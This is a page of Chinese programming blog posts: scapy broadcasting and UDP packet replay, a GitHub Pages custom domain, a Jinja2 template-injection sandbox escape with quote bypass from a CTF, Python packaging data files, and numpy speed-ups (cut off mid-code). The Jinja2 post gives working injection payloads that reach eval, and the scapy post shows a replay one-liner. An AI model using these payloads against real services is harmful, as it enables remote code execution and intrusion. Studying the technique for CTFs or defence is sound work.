<p>在 scapy 中， 可以直接把地址设置为<code>255.255.255.255</code>来广播， 但是会得到  </p>
<p><code>WARNING: Mac address to reach destination not found. Using broadcast.</code></p>
<p>这是因为使用 <code>send</code> 函数的缘故， 这个函数作用于 layer3 ， 自动组装了 layer2 层的东西， 目的 mac 地址这个时候就会在 arp 表中查询， 然而广播地址的 mac 地址是查不到的， 这个时候它就会提示程序自动把目的地址mac设置成了广播用的 mac</p>
<h4>solution</h4>
<p>使用<code>sendp</code>来发送包， 手动设置packet <code>Ether</code>的 <code>dst</code> 地址</p>
<div class="highlight"><pre><span></span>packet = Ether(dst=&#39;ff:ff:ff:ff:ff:ff&#39;)/IP(dst=&#39;192.168.31.255&#39;)/UDP(dport=33331)/b&#39;message&#39;
sendp(packet)
</pre></div>

<p>值得注意的是， <code>sendp</code>是可以使用指定的 interface 来发送包，默认情况下使用<code>conf.iface</code>的设备</p>
<h3>重放攻击</h3>
<p><code>sniff</code>用于监听网络流量， sniff 是阻塞的，可以使用回调函数来处理每一个捕获到的包。  同时可以使用 filter 参数过滤要捕获的包，也可以指定用于监听的 interface， 默认使用所有设备来监听  </p>
<p>filter 的语法和 tcpdump 中用于过滤的语法一样， 可以使用<code>man pcap-filter</code>查看详细的内容。</p>
<div class="highlight"><pre><span></span>sniff(filter=&#39;udp dst port 2333&#39;, prn=lamda pkt: pkt.show())
</pre></div>

<p>这段代码循环监听 目标端口为2333的 udp 包， 然后回调程序吧这个包展示出来。  </p>
<p>之后可以吧收到的包再发出去， 完成一次重放（UDP）</p>
<div class="highlight"><pre><span></span>sniff(prn=lambda pkt:sendp(pkt))
</pre></div>

<p>如果是 tcp 的重放，需要修改 ack。  </p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/github-page-zi-ding-yi-zi-yu-ming.html#github-page-zi-ding-yi-zi-yu-ming">Github Page 自定义子域名</a></h2>
    <p>
      Posted on Tue 02 May 2017 in <a href="http://littlezz.github.io/category/code.html">Code</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>,      <a href="http://littlezz.github.io/tag/xiao-ji-qiao.html">小技巧</a>      &#8226; <a href="http://littlezz.github.io/github-page-zi-ding-yi-zi-yu-ming.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <p>目标：设置域名</p>
<div class="highlight"><pre><span></span>xxx.github.io --&gt; blog.xxx.com
</pre></div>

<ul>
<li>
<p>首先在 github page 上面的项目里添加一个文件<code>CNAME</code>, 内容是目标站点<code>blog.xxx.com</code></p>
</li>
<li>
<p>之后， 在 DNS advance 上面增加一条CNAME记录， 如果要使用<code>blog.xxx.com</code>那么 <code>host</code> 的值填 <code>blog</code>而不是<code>blog.xxx.com</code>， value 填<code>xxx.github.io</code>  </p>
</li>
<li>
<p>如果你的 github page 是一个不断更新的博客， 必须在渲染时增加 CNAME 记录。  我是用的是 pelican， 设置方法是在<code>pelicanconf.py</code> 中设置</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="n">EXTRA_PATH_METADATA</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;static/CNAME&#39;</span><span class="p">:{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span><span class="s1">&#39;CNAME&#39;</span><span class="p">},</span>
<span class="p">}</span>

<span class="n">STATIC_PATHS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;images&#39;</span><span class="p">,</span> 
                <span class="s1">&#39;static&#39;</span><span class="p">]</span>
</pre></div>

<p>之后就是等待 dns 的刷新了</p>
<h3>小结</h3>
<p>CNAME 设置是 <code>blog</code>， 而不<code>blog.xxx.com</code>, 不然域名会解析到<code>blog.xxx.com.xxx.com</code></p>
<p>另外， pelican 默认只听是 googleapi 上面的， 虽然据说可能大概好像也许， 在北京有服务器， 但是我这里还是很慢， 于是我把字体的 url 改成了中科大的。  </p>
<p>方法：
在主题里的 templates 目录的<code>base.html</code>中</p>
<div class="highlight"><pre><span></span><span class="c">&lt;!--&lt;link href=&#39;//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic&#39; rel=&#39;stylesheet&#39; type=&#39;text/css&#39;&gt;--&gt;</span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;//fonts.proxy.ustclug.org/css?family=Source+Sans+Pro:300,400,700,400italic&#39;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#39;stylesheet&#39;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;text/css&#39;</span><span class="p">&gt;</span>
</pre></div>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html#jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing">jinja2 模板注入绕过引号任意代码执行</a></h2>
    <p>
      Posted on Mon 01 May 2017 in <a href="http://littlezz.github.io/category/python.html">Python</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>      &#8226; <a href="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <h3>intro</h3>
<p>不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。<del>（当然最后是用其他的方法</del></p>
<p>后来想了一下绕过引号的方法。</p>
<p>首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是<code>__buildtins__</code>, 然后找出 <code>eval</code>进行任意代码执行， 绕过沙盒的限制</p>
<div class="highlight"><pre><span></span><span class="ch">#! python3</span>

<span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
<span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;{{[].__class__}}&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>

<span class="c1">#output &quot;&lt;class &#39;list&#39;&gt;&quot;</span>
</pre></div>

<p>我们可以通过这种方法调用自带的函数或者对象， 通过<code>subclasses</code> 找到更加多的类</p>
<div class="highlight"><pre><span></span><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>

<span class="k">print</span><span class="p">([]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span>
<span class="c1">#output type</span>
</pre></div>

<p>之后利用其中的 <code>catch_warnings</code> 访问 globals 定位出 <code>eval</code>， 然后进行任意代码执行。</p>
<div class="highlight"><pre><span></span><span class="c1">#python3 </span>

<span class="n">In</span> <span class="p">[</span><span class="mi">146</span><span class="p">]:</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">166</span><span class="p">]</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">146</span><span class="p">]:</span> <span class="n">warnings</span><span class="o">.</span><span class="n">catch_warnings</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">153</span><span class="p">]:</span> <span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{{[].__class__.__base__.__subclasses__()[166].__init__.__g</span>
     <span class="o">...</span><span class="p">:</span> <span class="n">lobals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&quot;1+1&quot;</span><span class="p">)}}</span><span class="s1">&#39;).render()</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">153</span><span class="p">]:</span> <span class="s1">&#39;2&#39;</span>
</pre></div>

<h3>绕过引号</h3>
<p>一般情况下， <code>%</code>会被过滤， 但是如果引号也被过滤的话怎么构造出 eval 可以执行的字符串呢？</p>
<p>特别说明的是 <code>chr</code> 是没有办法在模板中调用的。因为在沙盒中这个函数是不存在的。（<code>chr</code>？不存在的。）</p>
<p>我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。</p>
<p>利用<code>bytes</code>， 但是 python3和 python2略有不同</p>
<div class="highlight"><pre><span></span><span class="c1"># python3</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">156</span><span class="p">]:</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">49</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">49</span><span class="p">])</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">156</span><span class="p">]:</span> <span class="sa">b</span><span class="s1">&#39;1+1&#39;</span>

<span class="n">In</span> <span class="p">[</span><span class="mi">157</span><span class="p">]:</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="mi">49</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">49</span><span class="p">]))</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">157</span><span class="p">]:</span> <span class="mi">2</span>
</pre></div>

<h4>python3</h4>
<p>利用：</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>

<span class="n">attack_str</span> <span class="o">=</span> <span class="s1">&#39;__import__(&quot;sys&quot;).version&#39;</span>
<span class="n">attack_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">attack</span><span class="p">]</span>
<span class="n">attack_input</span><span class="o">=</span><span class="s1">&#39;{{&#39;</span> <span class="o">+</span> <span class="s1">&#39;[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]({attack_list}))&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">attack_list</span><span class="o">=</span><span class="n">attack_list</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;}}&#39;</span>

<span class="k">print</span><span class="p">(</span><span class="n">attack_input</span><span class="p">)</span>
<span class="c1">#output {{[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]))}}</span>

<span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{user_input}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_input</span><span class="o">=</span><span class="n">attack_input</span><span class="p">))</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>

<span class="c1">#output &#39;3.6.1 (default, Mar 23 2017, 16:49:06) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)]&#39;</span>
</pre></div>

<h4>python2</h4>
<p>python2 的<code>catch_warnings</code>在<code>[59]</code>的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用<code>__str__</code>方法来转化成字符串。其余和 python3相同。</p>
<div class="highlight"><pre><span></span><span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>

<span class="c1">#output u&#39;2.7.10 (default, Feb  6 2017, 23:53:20) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]&#39;</span>
</pre></div>

<hr>
<p>2017-05-01 20:33:47</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html#pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng">Python打包时添加非代码文件的坑</a></h2>
    <p>
      Posted on Mon 12 December 2016 in <a href="http://littlezz.github.io/category/python.html">Python</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/xiao-jie.html">小结</a>      &#8226; <a href="http://littlezz.github.io/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <p>对于 Python 的打包， 通常有两种， 一种是对源文件打包， 一种是安装包， 既在上传 pypi 的时候一般会执行</p>
<div class="highlight"><pre><span></span>python3 setup.py sdist bdist_wheel
</pre></div>

<p>使用pip安装的时候一般是安装bdist打包出来的文件。</p>
<p>关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了<code>package_data</code>参数， 另外对于 setuptools 还提供了特别的 <code>include_package_data</code>的参数， 接下来介绍这些参数的意义和怎么用。  </p>
<h2>MANIFEST.in</h2>
<p>MANIFEST.in文件是针对 源文件打包 的， 当需要把非程序文件， 包括README， css或者test文件等加入时， 在MANIFEST.in中指定， 用于生成MANIFEST</p>
<p>MIANIFEST会暗中自动寻找以下的文件：  </p>
<ul>
<li>所有<code>py_modules</code> 和 <code>packages</code>中没有明确说明的python文件 </li>
<li>ext_modules 或 libraries选项中指明的C文件</li>
<li><code>scripts</code>指明的文件</li>
<li>所有看上去像是test文件的， 比如<code>tests/*.py</code></li>
<li>README.txt 或者 README, setup.py, setup.cfg</li>
<li><code>package_data</code>中指明的文件</li>
<li><code>data_files</code>中指明的文件</li>
</ul>
<h2>package_data</h2>
<p><code>package_data</code>是在setup.py中的参数， 用于控制安装包里面包含的文件。<br>
应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。  </p>
<p>一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。  </p>
<h2>include_package_data</h2>
<p>坑就是指<code>include_package_data</code>， 这个参数是setuptools特有的， 但是非常容易让人误解然后勿用。 setuptools的文档中是这样写的</p>
<blockquote>
<p>If set to True, this tells setuptools to automatically include any data files it finds inside your package directories that are specified by your MANIFEST.in file. For more information, see the section below on Including Data Files.</p>
</blockquote>
<p>设为 True 时， 打包时setuptools 会自动加入在 MANIFEST.in中指定的文件。</p>
<p>原本是 MANIFEST 在 setup.py 中的<code>package_data</code>寻找额外的文件的， 现在变成大家以 MANIFEST.in 为准了。</p>
<p>这会发生什么事情呢， 
如果你同时用了<code>include_package_data</code>和<code>package_data</code>， 那么你的 sdist 就会瞬间爆炸。<br>
bdist 打包出来的东西会包含<code>package_data</code>中的内容， 但是源代码打包的时候就会失去在<code>package_data</code>中指明的文件。  </p>
<h2>总结</h2>
<p><strong>永远也不要用<code>include_package_data</code></strong>  </p>
<p><code>MANIFEST.in</code> 用来给源文件打包， 里面包含许多额外的信息， 比如测试文件之类的。  </p>
<p><code>package_data</code>用于指定安装时加入的额外的文件， 不需要再MANIFEST.in中重复定义， 源文件打包的时候回自动包含这里面的文件。  </p>
<p>参考:</p>
<ul>
<li><a href="https://docs.python.org/3.4/distutils/sourcedist.html#specifying-the-files-to-distribute">specifying-the-files-to-distribute</a>  </li>
<li><a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#including-data-files">setuptools</a></li>
</ul>
<p>2016年12月12日01:04:25</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="http://littlezz.github.io/dui-numpyde-yi-xi-lie-shi-yan.html#dui-numpyde-yi-xi-lie-shi-yan">对numpy的一系列实验</a></h2>
    <p>
      Posted on Thu 08 December 2016 in <a href="http://littlezz.github.io/category/python.html">Python</a>
      &#8226; Tagged with
      <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/numpy.html">numpy</a>      &#8226; <a href="http://littlezz.github.io/dui-numpyde-yi-xi-lie-shi-yan.html#disqus_thread">Leave a comment</a>
    </p>
  </header>
  <div>
      <p>本文主要总结了如何把numpy计算速度优化100倍的过程。  </p>
<h2>简介</h2>
<p>最近要对图片做二值化， 参照<a href="http://people.scs.carleton.ca/~roth/iit-publications-iti/docs/gerh-50002.pdf">Adaptive Thresholding Using the Integral Image</a> 这篇论文， 可是Python的for循环非常的慢，单纯的翻译伪代码实现起来速度要比C慢接近100倍， 论文上的实现对640x480的图片用时大概为15ms， 接下来我们要一步步从最初的慢100倍优化到和C一样快， 以及最后再比它快一点点。</p>
<h2>算法</h2>
<p>首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 
过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. 
原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。  </p>
<h2>直观实现</h2>
<p>首先我们直接照着原理实现，理论是最快的
（然而实际是最慢的） </p>
<p><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">intuitive_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="n">mat</span> <span class="o">=</span> <span class="n">mat</span><span class="o">.</span><span class="n">T</span>
    <span class="n">integral_map</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
        <span class="n">csum</span><span class="o">=</span><span class="mi">0</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
            <span class="n">csum</span> <span class="o">+=</span> <span class="n">mat</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">integral_map</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">csum</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">integral_map</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">csum</span>

    <span class="n">half_s</span> <span class="o">=</span> <span class="p">(</span><span class="n">boxsize</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
            <span class="n">x1</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="n">half_s</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">x2</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">half_s</span><span class="p">,</span> <span class="n">w</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">y1</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="n">half_s</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">y2</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">h</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">field_sum</span> <span class="o">=</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">x2</span><span class="p">,</span> <span class="n">y2</span><span class="p">]</span> <span class="o">-</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">x1</span><span class="p">,</span> <span class="n">y2</span><span class="p">]</span> <span class="o">-</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">x2</span><span class="p">,</span> <span class="n">y1</span><span class="p">]</span> <span class="o">+</span> <span class="n">integral_map</span><span class="p">[</span><span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">]</span>
            <span class="n">count</span> <span class="o">=</span>  <span class="p">(</span><span class="n">x2</span><span class="o">-</span><span class="n">x1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">y2</span><span class="o">-</span><span class="n">y1</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">mat</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">count</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span> <span class="o">&lt;</span> <span class="n">field_sum</span><span class="o">*</span><span class="p">(</span><span class="mi">100</span><span class="o">-</span><span class="n">threshold</span><span class="p">):</span>
                <span class="n">ret</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">set_value</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">ret</span><span class="p">[</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>

    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span><span class="o">.</span><span class="n">T</span>
</pre></div>
mat是我们的图片矩阵， boxsize是区域的长度， 必须是奇数。 
每个点都在周围取一个boxsize长度的矩形， 要特别处理边界， 让他不要超出累积矩阵。<br>
很直观的代码， 纯翻译自论文里面的伪代码。  </p>
<p>看看速度：</p>
<p><div class="highlight"><pre><span></span>⇒  python3 implement.py
Image shape 640x480
intuitive_method take 1658.280885 ms  
</pre></div>
1600ms, （怎么和说好的15ms不一样）。</p>
<h2>改进的直观方法</h2>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">optimized_intuitive_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="n">mat</span> <span class="o">=</span> <span class="n">mat</span><span class="o">.</span><span class="n">T</span>
    <span class="n">integral_map</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">np</span><span class="o">.</span><span class="n">cumsum</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="n">integral_map</span><span class="p">)</span>
    <span class="n">np</span><span class="o">.</span><span class="n">cumsum</span><span class="p">(</span><span class="n">integral_map</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="n">integral_map</span><span class="p">)</span>

    <span class="n">half_s</span> <span class="o">=</span> <span class="n">boxsize</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
    <span class="n">inv_value</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
            <span class="n">x1</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="n">half_s</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">x2</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">w</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">y1</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">j</span> <span class="o">-</span> <span class="n">half_s</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">y2</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">half_s</span><span class="p">,</span> <span class="n">h</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">field_sum</span> <span class="o">=</span> <span class="n">integral_map</span><span class="o">.</span><span class="n">item</span><span class="p">(</span><span class="n">x2</span><span class="p">,</span> <span class="n">y2</span><span class="p">)</span> <span class="o">-</span> <span class="n">integral_map</span><span class="o">.</span><span class="n">item</span><span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">y2</span><span class="p">)</span> <span class="o">-</span> <span class="n">integral_map</span><span class="o">.</span><span class="n">item</span><span class="p">(</span><span class="n">x2</span><span class="p">,</span> <span class="n">y1</span><span class="p">)</span> <span class="o">+</span> <span class="n">integral_map</span><span class="o">.</span><span class="n">item</span><span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">y1</span><span class="p">)</span>
            <span class="n">count</span> <span class="o">=</span>  <span class="p">(</span><span class="n">x2</span><span class="o">-</span><span class="n">x1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">y2</span><span class="o">-</span><span class="n">y1</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">mat</span><span class="o">.</span><span class="n">item</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span> <span class="o">*</span> <span class="n">count</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span> <span class="o">&lt;</span> <span class="n">field_sum</span><span class="o">*</span><span class="p">(</span><span class="mi">100</span><span class="o">-</span><span class="n">threshold</span><span class="p">):</span>
                <span class="n">ret</span><span class="o">.</span><span class="n">itemset</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">set_value</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">ret</span><span class="o">.</span><span class="n">itemset</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">inv_value</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span><span class="o">.</span><span class="n">T</span>
</pre></div>

<p>Numpy提供了item和itemset方法来加速对矩阵上单个点的操作。<br>
同时两次累积和实际可以用可以用<code>np.cumsum</code>来计算， 但是这里有一个小细节，<br>
单纯的使用两次<code>a=np.cumsum(...)</code>会额外进行一次内部的内存拷贝， 我们要指定<code>out</code>参数来阻止多余的内存拷贝.</p>
<p>在计算half_s的时候， 使用移位<code>boxsize &gt;&gt; 1</code>来加速。  </p>
<p><div class="highlight"><pre><span></span>⇒  python3 implement.py
Image shape 640x480
optimized_intuitive_method take 823.928799 ms
</pre></div>
快了一倍， 但是还是不够</p>
<h2>猥琐法</h2>
<p>不妨让我们直接退化到累积和的优化之前，纯粹的暴力计算，所有计算都交给opencv， 看看会发生什么事情。</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">opencv_way</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
    <span class="n">mat</span> <span class="o">=</span> <span class="n">mat</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span>
    <span class="n">inv_value</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>
